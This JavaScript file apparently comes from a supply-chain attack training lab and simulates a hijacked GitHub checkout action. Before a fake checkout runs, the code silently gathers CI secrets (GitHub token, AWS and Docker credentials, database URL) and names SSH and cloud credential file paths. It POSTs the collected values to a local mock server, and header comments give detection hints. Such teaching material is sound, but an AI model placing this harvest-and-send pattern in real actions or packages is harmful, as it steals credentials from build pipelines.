/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori — Supply Chain Attack Simulator
 * Scenario 25: Compromised Reusable GitHub Action
 *
 * MALICIOUS checkout action — EDUCATIONAL USE ONLY
 *
 * This simulates a compromised `example/actions/checkout@v3` reusable action.
 * The maintainer account was compromised and the mutable `v3` tag was
 * force-pushed to point at this malicious commit.
 *
 * SAFETY FEATURES:
 *   - Hard-gated on TESTBENCH_MODE=enabled
 *   - Exfiltrates only to 127.0.0.1:3025 (mock server)
 *   - Collects already-set fake CI values, not real secrets
 *
 * DETECTION HINTS:
 *   1. Action reads environment variables and makes HTTP requests.
 *   2. Exfiltration happens before the legitimate checkout output.
 *   3. Mutable version tag in the workflow (`@v3`) instead of a commit SHA.
 */

'use strict';

const http = require('http');

function harvestAndExfiltrate() {
    // SAFETY CHECK: only run in the testbench environment
    if (process.env.TESTBENCH_MODE !== 'enabled') {
        return;
    }

    console.log('[TESTBENCH] checkout@v3: simulating CI secret harvest...');

    const harvestedData = {
        scenario: '25',
        event_type: 'ci_secret_exfil',
        source: 'example/actions/checkout@v3',
        attack_vector: 'force-pushed-tag',
        destination: '127.0.0.1:3025',
        timestamp: new Date().toISOString(),
        ci_env: {
            GITHUB_TOKEN: process.env.GITHUB_TOKEN || '(not set in this shell)',
            GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY || 'acme-corp/webapp',
            GITHUB_ACTOR: process.env.GITHUB_ACTOR || 'ci-bot',
            GITHUB_SHA: process.env.GITHUB_SHA || 'abc123def456',
            GITHUB_REF: process.env.GITHUB_REF || 'refs/heads/main',
            AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID || '(not set)',
            AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY ? '[REDACTED-lab]' : '(not set)',
            DATABASE_URL: process.env.DATABASE_URL || '(not set)',
            DOCKER_USERNAME: process.env.DOCKER_USERNAME || '(not set)',
            DOCKER_PASSWORD: process.env.DOCKER_PASSWORD ? '[REDACTED-lab]' : '(not set)'
        },
        filesystem_paths_checked: [
            '~/.ssh/id_rsa',
            '~/.aws/credentials',
            '~/.kube/config',
            '~/.docker/config.json'
        ]
    };

    const payload = JSON.stringify(harvestedData);
    const options = {
        hostname: '127.0.0.1',
        port: 3025,
        path: '/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const req = http.request(options, () => {
        console.log('[TESTBENCH] checkout@v3: exfil beacon sent to mock server (127.0.0.1:3025)');
    });

    req.on('error', (e) => {
        // Real malware silently fails; in the lab we log for learning
        console.log('[TESTBENCH] checkout@v3: mock server not available:', e.message);
    });

    req.write(payload);
    req.end();

    try {
        const { uploadJson } = require('../../../../../../detection-tools/floci/floci-exfil');
        uploadJson('25', 'ci-secret-exfil', harvestedData);
    } catch (_) {}
}

// Malicious code runs BEFORE the legitimate checkout logic
try {
    harvestAndExfiltrate();
} catch (_) {
    // Silent catch keeps the pipeline from failing
}

// ============================================================================
// LEGITIMATE CHECKOUT SIMULATION
// ============================================================================
// The action still appears to work so the CI step completes normally.

function checkout(target) {
    console.log(`[checkout@v3] Checked out repository: ${target}`);
    return { path: target };
}

if (require.main === module) {
    checkout(process.env.INPUT_REPOSITORY || process.env.GITHUB_WORKSPACE || '.');
}

module.exports = checkout;
